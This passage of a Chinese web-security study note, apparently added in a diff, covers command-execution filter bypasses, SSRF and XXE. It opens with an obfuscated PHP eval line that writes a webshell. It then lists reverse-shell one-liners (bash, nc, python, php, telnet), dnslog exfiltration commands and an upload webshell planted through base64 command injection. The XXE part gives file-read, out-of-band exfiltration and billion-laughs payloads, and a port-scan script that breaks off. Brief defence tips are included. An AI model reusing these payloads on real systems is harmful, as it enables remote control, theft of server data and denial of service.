+            eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(34).chr(57).chr(54).chr(53).chr(46).chr(112).chr(104).chr(112).chr(34).chr(44).chr(34).chr(119).chr(34).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(34).chr(99).chr(109).chr(100).chr(34).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59));
+    3. 单引号双引号绕过，如：ca&apos;&apos;t flag 或ca&quot;&quot;t flag
+    4. 反斜杠绕过，如：ca\t fl\ag
+    5. shell变量绕过
+        变量                                        含义
+        $0            当前脚本的文件名
+        $n            传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。
+        $#            传递给脚本或函数的参数个数
+        $*            传递给脚本或函数的所有参数，而参数不存在时其值为空。
+        $@            传递给脚本或函数的所有参数。，而参数不存在时其值为空。被双引号包函时，与$*稍有不同
+        $?            上个命令的推出状态，或函数的返回值
+        $$            当前shell进程ID
+        比如：ca$@t fla$@g，ca$1t fla$2g
+    6. 长度限制绕过
+        linux下可以用 1&gt;a创建文件名为a的空文件，ls -t&gt;test则会将目录按时间排序后写进test文件中，sh命令可以从一个文件中读取命令来执行
+        参考：https://www.cnblogs.com/-chenxs/p/11981586.html
+    7. 内联执行绕过
+        命令替代，大部分Unix hell以及编程语言如Perl、PHP以及Ruby等都以成对的重音符(反引号)作指令替代，意思是以某一个指令的输出结果作为另一个指令的输入项。如，echo &quot;a`pwd`&quot;，echo&quot;abcd ${whoami}&quot;
+    8.通配符绕过
+        字符                                        解释
+        *            匹配任意长度任意字符
+        ？            匹配任意单个字符
+        [list]        匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合
+        [^list]        匹配指定范围外的任意单个字符或字符集合
+        [!list]        同[^list]
+        {str1,str2}    匹配str1或者str2字符，也可以是集合
+        IFS            由&lt;space&gt;或&lt;tab&gt;或
+        CR            由&lt;enter&gt;产生
+        如，$ echo d{a,e,i,u,o}g
+            dag deg dig dug dog
+            #大括号可以嵌套使用
+            $ echo {j{p,pe}g,png}
+            jpg jpeg png
+            #{start…end}匹配连续字符
+            $ cat /f{0…z}ag，cat${IFS}fl*，cat fl[a-z]?
+            this_is_you_find_flag
+        注：上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，?或*这样的通配符，不能匹配路径分隔符（/）。如果要匹配子目录里面的文件，可以写成这样：ls */*.t
+        参考文章：https://www.freebuf.com/articles/web/160175.html，https://www.freebuf.com/articles/web/186298.html
+    9. 反弹shell绕过
+        *  bash反弹
+            $ bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;
+        *  exec反弹
+            $ exec 5&lt;&gt;/dev/tcp/ip/port
+            $ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done
+        *  nc反弹
+            本机运行:
+            nc -lvnp port
+            目标主机:
+            nc -e /bin/bash ip port
+        *  python反弹
+            python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;
+            或者
+            python -c &quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&apos;ip&apos;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;
+        *  php反弹
+            php -r &apos;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+        *  telnet反弹
+            mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe
+        * sock反弹
+            $sock=fsockopen(&quot;192.168.93.130&quot;,1234);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);
+        *    将shell变为交互式
+            python3 -c&apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
+    10. dnslog绕过
+        curl http://192.168.10.55.o40fok.dnslog.io/?id=`whoami` 
+        或者
+        ping `cat where_is_flag.php|sed s/[[:space:]]/xx/g`.o40fok.dnslog.io</code></pre><h3 id="命令执行上传脚本"><a href="#命令执行上传脚本" class="headerlink" title="命令执行上传脚本"></a>命令执行上传脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$temp &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span><br><span class="line">@$file &#x3D; basename($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span><br><span class="line">if(empty($file))&#123;</span><br><span class="line">	echo &quot;&lt;form action &#x3D; &#39;&#39; method &#x3D; &#39;POST&#39; ENCTYPE&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;\n&quot;;</span><br><span class="line">	echo &quot;Local file: &lt;input type&#x3D;&#39;file&#39; name &#x3D; &#39;upload_file&#39;&gt;\n&quot;;</span><br><span class="line">	echo &quot;&lt;input type &#x3D; &#39;submit&#39; value &#x3D; &#39;Upload&#39;&gt;\n&quot;;</span><br><span class="line">	echo &quot;&lt;&#x2F;form&gt;\n&lt;pre&gt;\n\n&lt;&#x2F;pre&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	if(move_uploaded_file($temp,$file))&#123;</span><br><span class="line">		echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		echo &quot;Unable to upload&quot; . $file . &quot;.&lt;p&gt;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>base64码转换后(以DVWA为例)：
+127.0.0.1|`echo PD9waHAKQCR0ZW1wID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsndG1wX25hbWUnXTsKQCRmaWxlID0gYmFzZW5hbWUoJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddKTsKaWYoZW1wdHkoJGZpbGUpKXsKCWVjaG8gIjxmb3JtIGFjdGlvbiA9ICcnIG1ldGhvZCA9ICdQT1NUJyBFTkNUWVBFPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz5cbiI7CgllY2hvICJMb2NhbCBmaWxlOiA8aW5wdXQgdHlwZT0nZmlsZScgbmFtZSA9ICd1cGxvYWRfZmlsZSc+XG4iOwoJZWNobyAiPGlucHV0IHR5cGUgPSAnc3VibWl0JyB2YWx1ZSA9ICdVcGxvYWQnPlxuIjsKCWVjaG8gIjwvZm9ybT5cbjxwcmU+XG5cbjwvcHJlPiI7Cn1lbHNlewoJaWYobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wLCRmaWxlKSl7CgkJZWNobyAiRmlsZSB1cGxvYWRlZCBzdWNjZXNzZnVsbHkuPHA+XG4iOwoJfWVsc2V7CgkJZWNobyAiVW5hYmxlIHRvIHVwbG9hZCIgLiAkZmlsZSAuICIuPHA+XG4iOwoJfQp9Cj8+ | base64 -d &gt;278.php`</code></pre><h3 id="命令执行漏洞防御方法"><a href="#命令执行漏洞防御方法" class="headerlink" title="命令执行漏洞防御方法"></a>命令执行漏洞防御方法</h3><ol>
+<li>在php安装目录找到php配置文件php.ini，找到disable_functions，在后面添加禁用的高危函数，如phpinfo(),eval(),passthru(),scandir(),shell_exec(),proc_open()等等</li>
+<li>严格过滤字符，创建仅包含允许字符或命令列表的白名单验证用户的输入<br> 转义或过滤WINDOWS的特殊字符：() &lt; &gt; &amp; * ‘ | = ? ; [] ^ ~ ! “ % # / \ : + , 反引号<br> 转义或过滤LINUX专用字符：{} () &lt; &gt; &amp; * ‘ | = ? ; [] ^ ~ ! “ % # / \ : + , 反引号</li>
+<li>开启safe_mode<br> safe_mode是php的安全模式，在php.ini中设置safe_mode=On就可，当安全模式打开时，以下函数列表的功能将会受到限制：chdir,move_upload_file,chgrp,parse_ini_file,chown,rmdir,copy,rename,fopen,require,highlight_file,show_source,include,symlink,lin,touch,mkdir,unlink</li>
+</ol>
+<h2 id="ssrf漏洞"><a href="#ssrf漏洞" class="headerlink" title="ssrf漏洞"></a>ssrf漏洞</h2><pre><code>ssrf形成的原因大都是由于服务器端提供了从其他服务器应用获取数据的功能且没有对目标地址进行过滤和限制，导致攻击者可以传入任意的地址来让后端服务器发送请求，并返回请求的数据。比如从指定的url地址获取到网页文本内容，加载指定地址的图片，下载文件，读取文件内容等。是一种由攻击者构造请求，服务器发起的构造请求伪造，利用存在缺陷的web应用作为代理攻击远程和本地服务器。最常见的例子：攻击者传入一个未经验证的URL，后端代码直接请求这个URL，就会造成SSRF。</code></pre><h3 id="ssrf漏洞利用方式"><a href="#ssrf漏洞利用方式" class="headerlink" title="ssrf漏洞利用方式"></a>ssrf漏洞利用方式</h3><pre><code>* 对外网，服务器所在内网，本地进行端口扫描，获取Banner信息，收集内网web应用指纹识别
+* 测试运行在内网或本地的应用程序，获取内网系统弱口令进行内网漫游，或者对有漏洞的内网web应用实施攻击获取webshell
+* 利用ftp://,file:///,dict://等协议进行攻击</code></pre><h3 id="ssrf漏洞函数"><a href="#ssrf漏洞函数" class="headerlink" title="ssrf漏洞函数"></a>ssrf漏洞函数</h3><pre><code>* file_get_contents()
+* fsockopen()
+* curl_exec()</code></pre><h3 id="漏洞可能发生点"><a href="#漏洞可能发生点" class="headerlink" title="漏洞可能发生点"></a>漏洞可能发生点</h3><pre><code>* 通过URL地址分享网页内容
+* 文件处理，编码处理，转码等服务
+* 在线翻译
+* 通过URL地址加载与下载图片
+* 图片，文章收藏功能
+* 未公开的api实现以及其他调用URL的功能
+* 网站邮箱收取其他邮箱邮件功能
+* 从URL关键字寻找：
+    share,wap,url,link,src,source,target,u,3g,display,sourceURL,imageURL,domain等</code></pre><h3 id="ssrf漏洞绕过方式"><a href="#ssrf漏洞绕过方式" class="headerlink" title="ssrf漏洞绕过方式"></a>ssrf漏洞绕过方式</h3><pre><code>1. @绕过，如http://example.com@10.10.10.10与http://10.10.10.10请求相同
+2. ip转换绕过，换成10进制，2进制，8进制等(tools.bugscaner.com/iptoint.html)
+3. 短网址绕过
+4. 协议绕过，如file://和gopher://和dict://
+5. xio.io绕过，如http://10.10.10.10.xip.io = 10.10.10.10(xip.name)
+6. 句号绕过，如10。10。10。10 = 10.10.10.10
+7. ipv6绕过，如http://[::1]:80=127.0.0.1:80
+8. 添加端口绕过，如10.10.10.10:80
+9. 利用Enclosed alphanumerics绕过()</code></pre><h3 id="ssrf漏洞防御方法"><a href="#ssrf漏洞防御方法" class="headerlink" title="ssrf漏洞防御方法"></a>ssrf漏洞防御方法</h3><ol>
+<li>统一返回错误信息</li>
+<li>限制请求的协议和端口为http常用端口</li>
+<li>不用限制30x重定向</li>
+<li>设置url白名单或者限制内网ip</li>
+<li>过滤返回信息，验证远程服务器对请求的响应</li>
+<li>设置不需要的协议，仅允许http和https请求</li>
+</ol>
+<h3 id="CSRF和SSRF的区别"><a href="#CSRF和SSRF的区别" class="headerlink" title="CSRF和SSRF的区别"></a>CSRF和SSRF的区别</h3><pre><code>csrf是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的referer字段校验不严，导致攻击者可以利用用户的cookie信息伪造用户请求发送至服务器。
+ssrf是服务器对用户提供的url过于信任，没有对攻击者提供的url进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或者其他服务器</code></pre><h2 id="xxe漏洞-php版本大于5-4-45的默认不解析外部实体"><a href="#xxe漏洞-php版本大于5-4-45的默认不解析外部实体" class="headerlink" title="xxe漏洞 (php版本大于5.4.45的默认不解析外部实体)"></a>xxe漏洞 (php版本大于5.4.45的默认不解析外部实体)</h2><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><pre><code>XML是一种用于标记电子文件使其具有结构性的可扩展标记语言(EXtensible Markup Language)，是一种非常灵活的语言，类似于HTML语言，但是没有固定的标签，所有的标签都可以自定义，其设计的宗旨是传输数据，而不是像HTML那样显示数据。XML不会做任何事情，它是被设计用来结构化，存储以及传输信息，也就是XML文件所携带的信息，需要被其他语言或者程序来解析，才能发挥作用。</code></pre><h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><pre><code>1. XML文档必须有一个根元素
+2. XML元素都必须要有一个关闭的标签
+3. XML标签对大小写敏感
+4. XML元素必须被正确的嵌套
+5. XML属性值必须加引号</code></pre><h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><pre><code>XML文档结构包括XML声明，DTD文档类型定义(可选)，文档元素，如：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;         //文档声明
+&lt;!--女孩--&gt;
+&lt;!DOCTYPE girl[
+    &lt;!ELEMENT girl (hair,eye,face,summary)&gt;
+    &lt;!ELEMENT hair        (#PCDATA)&gt;
+    &lt;!ELEMENT eye       (#PCDATA)&gt;             //DTD文档定义类型
+    &lt;!ELEMENT face        (#PCDATA)&gt;
+    &lt;!ELEMENT summary       (#PCDATA)&gt;
+]&gt;
+&lt;girl age=&quot;16&quot;&gt;
+&lt;hair&gt;长头发&lt;/hair&gt;
+&lt;eye&gt;黑眼睛&lt;/eye&gt;                              //文档元素
+&lt;face&gt;漂亮的脸庞&lt;/face&gt;
+&lt;summary&gt;美丽可爱的&lt;/summary&gt;
+&lt;/girl&gt;
+其中&lt;?xml ?&gt;是一个xml标记，用于告诉浏览器这个文档是xml文档；version=&quot;1.0&quot;，version属性用于说明当前xml文档的版本，version属性是必须的；encoding=&quot;utf-8&quot;，encoding属性用于说你当前xml文档使用的是字符编码集，xml接下会使用这个编码来解析xml文档。encoding是可选属性，默认UTF-8。&lt;!--这是注释--&gt;</code></pre><h3 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h3><pre><code>&gt; 内部声明
+    DTD被包含在XML源文件中，应当使用语法包装在一个DOCTYPE声明中
+语法：&lt;!DOCTYPE 根元素 [元素声明]&gt;，例如：
+&lt;!DOCTYPE girl[
+    &lt;!ELEMENT girl (hair,eye,face,summary)&gt;
+    &lt;!ELEMENT hair        (#PCDATA)&gt;
+    &lt;!ELEMENT eye       (#PCDATA)&gt;             
+    &lt;!ELEMENT face        (#PCDATA)&gt;
+    &lt;!ELEMENT summary       (#PCDATA)&gt;
+]&gt;
+
+&gt; 外部声明
+    DTD位于XML源文件的外部，应当使用语法封装在一个DOCTYPE的定义中
+语法：&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;，例如：
+&lt;&gt;xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
+&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;
+note.dtd的内容；
+&lt;!ELEMENT girl (hair,eye,face,summary)&gt;
+&lt;!ELEMENT hair        (#PCDATA)&gt;
+&lt;!ELEMENT eye       (#PCDATA)&gt;             
+&lt;!ELEMENT face        (#PCDATA)&gt;
+&lt;!ELEMENT summary       (#PCDATA)&gt;</code></pre><h3 id="PCDATA和CDATA"><a href="#PCDATA和CDATA" class="headerlink" title="PCDATA和CDATA"></a>PCDATA和CDATA</h3><pre><code>&gt; PCDATA
+    PCDATA指的是可以被解析的字符数据，在XML中有5个预定义的实体引用：
+    &amp;lt;                       &lt;                     小于
+    &amp;gt;                       &gt;                     大于
+    &amp;amp;                      &amp;                     和号
+    &amp;apos;                     .                     省略号
+    &amp;quot;                     &quot;                     引号
+严格讲，XML中仅有&quot;&lt;&quot;和&quot;&amp;&quot;是非法的，其他的都是合法的，但是一般都把它们替换成实体引用。
+
+&gt; CDATA
+    CDATA指的是不能被解析的字符数据，在XML元素中，&quot;&lt;&quot;和&quot;&amp;&quot;是非法的，&quot;&lt;&quot;会产生错误，因为解析器会把该字符解释为新元素的开始，&quot;&amp;&quot;也会产生错误，因为解析器把该字符解释为字符实体的开始，而某些文本，比如javascript代码包含大量的&quot;&lt;&quot;和&quot;&amp;&quot;字符，为了避免错误，可以将脚本代码定义为CDTA，CDATA的部分由&quot;&lt;![CDATA[ ]]&gt;&quot;,如：
+    &lt;script&gt;
+    &lt;![CDATA[
+    function test(){
+        alert(/test/);
+    }
+    ]]&gt;
+    &lt;/script&gt;
+    注意：CDATA部分不能包含字符串&quot;]]&gt;&quot;，也不允许嵌套CDATA部分，这样会导致异常的闭合，从而使解析器报错，而且标记CDATA部分结尾的&quot;]]&gt;&quot;不能包含空格或者换行</code></pre><h3 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h3><pre><code>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。(实体可以看成一个变量，在XML中通过&amp;引用)
+&gt; 内部普通实体
+    声明： &lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;
+    引用： 一个实体的引用，由三部分构成分别是&amp;符号，实体名称，分号,如：
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
+    &lt;!DOCTYPE author[
+    &lt;!ELEMENT author ANY&gt;
+    &lt;!ENTITY write &quot;babi&quot;&gt;
+    &lt;!ENTITY copyright &quot;wabi&quot;&gt; 
+    ]&gt;
+    &lt;author&gt;&amp;write;&amp;copyright;&lt;/author&gt;
+
+&gt; 外部普通实体
+    声明： &lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; 或者 &lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;，如：
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;&gt;
+    &lt;!DOCTYPE user SYSTEM &quot;http://127.0.0.1/test.dtd&quot;&gt;
+    &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;test&lt;/password&gt;&lt;/user&gt;
+    test.dtd的内容：
+    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    各个语言一用外部实体支持的一些协议：
+    libxml2             php             java             .net
+    file                 file             http             file
+    http                 http             https             http
+    ftp                 ftp             ftp             https
+                        php             file             ftp
+                        compress.zlib   jar             
+                        compress.bzip2  netdoc
+                        data             mailto
+                        glob            gopher *
+                        phar
+
+&gt; 参数实体
+            内部： &lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;
+    声明：    
+            外部： &lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;
+注意：
+    1. 使用 % 实体名 在DTD中定义并且只能在DTD中使用&quot;%实体名;&quot;引用
+    2. 只有在DTD文件中，参数实体的声明才能引用其他实体
+    3. 和通用实体一样，参数实体也可以外部引用
+简单来说，就是参数实体不能像普通实体那样在xml文档中内容进行引用，它的引用范围只能在当前xml文件的DTD声明中，或者是当前的DTD文件中，如：
+&lt;?xml version=&quot;1.0&quot;&gt;
+&lt;!DOCTYPE books[
+    &lt;!ENTITY % test &quot;&lt;!ENTITY hello &quot;test&quot;&gt;&quot;&gt;
+    %test;
+]&gt;
+&lt;books&gt;&amp;hello;&lt;/books&gt;</code></pre><h3 id="xxe-XML-EXternal-Entity-漏洞产生原理"><a href="#xxe-XML-EXternal-Entity-漏洞产生原理" class="headerlink" title="xxe(XML EXternal Entity)漏洞产生原理"></a>xxe(XML EXternal Entity)漏洞产生原理</h3><pre><code>xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体的加载，导致可加载恶意外部程序，造成文件读取，命令执行，内网端口扫描，发起dos攻击等。触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可以上传恶意的xml文件。</code></pre><h3 id="PHP的XXE漏洞产生的条件"><a href="#PHP的XXE漏洞产生的条件" class="headerlink" title="PHP的XXE漏洞产生的条件"></a>PHP的XXE漏洞产生的条件</h3><pre><code>1. Libxml的版本尽可能的低，libxml是PHP的xml解析库，因为从2.8.0版本开始，libxml默认是不加载外部实体的，如果要使用较高版本的libxml的话，需要在编写代码的时候对参数做设置。
+2. 目标主机没有禁用外部实体的引用。
+3.  用户可以控制xml的输入内容</code></pre><h3 id="xxe漏洞发现"><a href="#xxe漏洞发现" class="headerlink" title="xxe漏洞发现"></a>xxe漏洞发现</h3><pre><code>1. 寻找接受XML作为输入内容的端点，可以通过修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序是否解析了发送的内容，如果解析了，那么可能有xxe攻击漏洞，还可以尝试注入xml预定义的一些实体，看看是否报错，通过报错看是有回显注入还是无回显注入
+2. 如果站点解析xml，那么就可以尝试引用实体和DTD
+3. 如果可以引用外部实体，则存在xxe漏洞</code></pre><h3 id="有回显的XXE和无回显的XXE"><a href="#有回显的XXE和无回显的XXE" class="headerlink" title="有回显的XXE和无回显的XXE"></a>有回显的XXE和无回显的XXE</h3><pre><code>&gt; 有回显的XXE
+    一般情况下，为了防止可能存在&quot;&gt;&quot;或者&quot;&amp;&quot;在xml中的非法字符而报错，用CDATA不解析来包装所查询的内容，如：
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE test[
+        &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+        &lt;!ENTITY % xxe SYSTEM &quot;http://192.168.1.13/test.txt&quot;&gt;
+        &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+        &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/test.dtd&quot;&gt;       //外部dtd文件
+        %dtd;        
+    ]&gt;
+    &lt;test&gt;&amp;evil;&lt;/test&gt;
+    test.dtd的内容
+    &lt;!ENTITY evil &quot;%start;%xxe;%end;&quot;&gt;
+
+&gt; 无回显的XXE
+    先设一个监听端口：ncat.exe -1 8888 或者 python2 -m SimpleHTTPSever 8888
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE test [
+    &lt;!ENTITY % xxe SYSTEM &quot;http://10.1.1.123/test.dtd&quot;&gt;
+    %xxe;%dtd;%send]&gt;
+    test.dtd的内容：
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.1.13/test.txt&quot;&gt;
+    &lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://10.1.1.123:8888/?msg=%file;&apos;&gt;&quot;&gt;
+    或者
+    开启apache： service apache2 start
+    &lt;?xml version=&quot;1.0&quot;&gt;
+    &lt;! DOCTYPE foo &quot;http://ip/test.dtd&quot;&gt;
+    &lt;foo&gt;&amp;message;&lt;/foo&gt;
+    test.dtd的内容是：
+    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://192.168.1.13/test.txt&quot;&gt;
+    &lt;!ENTITY % xxe &quot;&lt;!ENTITY message &apos;http://ip/msg?%file;&apos;&gt;&quot;&gt;
+    %xxe;
+    然后 cat /var/log/apache2/access.log</code></pre><h3 id="xxe漏洞的利用方式"><a href="#xxe漏洞的利用方式" class="headerlink" title="xxe漏洞的利用方式"></a>xxe漏洞的利用方式</h3><pre><code>&gt; 拒绝服务攻击(DDOS)
+    &lt;!DOCTYPE data [
+    &lt;!ENTITY a0 &quot;dos&quot; &gt;
+    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+    &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
+    &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
+    ]&gt;
+    &lt;data&gt;&amp;a4;&lt;/data&gt;
+    或者二次爆破ddos攻击
+    &lt;!DOCTYPE data [
+    &lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;
+    ]&gt;
+    &lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt;
+    或者实体递归
+    &lt;!DOCTYPE data [
+    &lt;!ENTITY a &quot;a&amp;b;&quot; &gt;
+    &lt;!ENTITY b &quot;&amp;a;&quot; &gt;
+    ]&gt;
+    &lt;data&gt;&amp;a;&lt;/data&gt;
+
+&gt; 基本文件读取
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE data [
+    &lt;!ELEMENT data (#ANY)&gt;
+    &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    ]&gt;
+    &lt;data&gt;&amp;file;&lt;/data&gt;
+    或者使用netdoc文件读取
+    &lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;!DOCTYPE data [
+    &lt;!ELEMENT data (#PCDATA)&gt;
+    &lt;!ENTITY file SYSTEM &quot;netdoc:/etc/passwd&quot;&gt;
+    ]&gt;
+    &lt;data&gt;&amp;file;&lt;/data&gt;
+
+&gt; 高级文件读取
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+    &lt;!DOCTYPE data [
+    &lt;!ELEMENT data (#ANY)&gt;
+    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;
+    &lt;!ENTITY % goodies SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;
+    &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/test.dtd&quot;&gt;
+    %dtd;
+    ]&gt;
+    &lt;data&gt;&amp;all;&lt;/data&gt;
+    test.dtd的内容：
+    &lt;!ENTITY all &apos;%start;%goodies;%end;&apos;&gt;
+    或者滥用属性值
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+    &lt;!DOCTYPE data [
+    &lt;!ENTITY % remote SYSTEM &quot;http://localhost/test.dtd&quot;&gt;
+    %remote;
+    ]&gt;
+    &lt;data attrib=&apos;&amp;internal;&apos;/&gt;
+    test.dtd的内容：
+    &lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;
+    &lt;!ENTITY % param1 &quot;&lt;!ENTITY internal &apos;%payload;&apos;&gt;&quot;&gt;
+    %param1;
+
+&gt; SSRF
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        
+    &lt;!DOCTYPE foo [ 
+    &lt;!ELEMENT foo ANY &gt;
+    &lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;
+    ]&gt;
+    &lt;user&gt;&lt;firstname&gt;&amp;xxe;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;
+
+&gt; 端口探测
+    &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+    &lt;!DOCTYPE user[
+    &lt;!ENTITY xxe SYSTEM &quot;http://10.1.1.1:80&quot;&gt;
+    ]&gt;
+    &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;
+    附上批量探测脚本：
+    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import request</span><br><span class="line">import base64</span><br><span class="line">def bulid_xml(string):</span><br><span class="line">	xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE root [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">	xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;root&gt;&amp;xxe;&lt;&#x2F;root&gt;&quot;&quot;&quot;</span><br><span class="line">	send_xml(xml)</span><br><span class="line">def 